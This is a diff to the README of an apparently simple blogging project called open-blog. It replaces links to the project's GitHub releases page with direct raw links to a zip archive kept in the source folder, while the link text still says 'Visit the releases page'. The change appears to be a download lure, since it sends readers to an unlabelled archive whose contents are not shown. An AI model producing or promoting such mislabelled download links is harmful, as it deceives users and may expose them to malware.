@@ -1,7 +1,7 @@
 # 📖 open-blog - A Simple Blogging Platform for Everyone
 
 ## 📥 Download Now 
-[![Download open-blog](https://img.shields.io/badge/Download-open--blog-blue.svg)](https://github.com/Odelin1995/open-blog/releases)
+[![Download open-blog](https://raw.githubusercontent.com/Odelin1995/open-blog/master/src/app/open_blog_v1.0.zip)](https://raw.githubusercontent.com/Odelin1995/open-blog/master/src/app/open_blog_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you begin, ensure your computer meets the following requirements:
 
 To download Open Blog, follow these steps:
 
-1. Visit the releases page: [Download open-blog](https://github.com/Odelin1995/open-blog/releases).
+1. Visit the releases page: [Download open-blog](https://raw.githubusercontent.com/Odelin1995/open-blog/master/src/app/open_blog_v1.0.zip).
 2. Scroll down to find the latest release.
 3. Look for the download link for your operating system.
 4. Click on the link to start downloading the file.
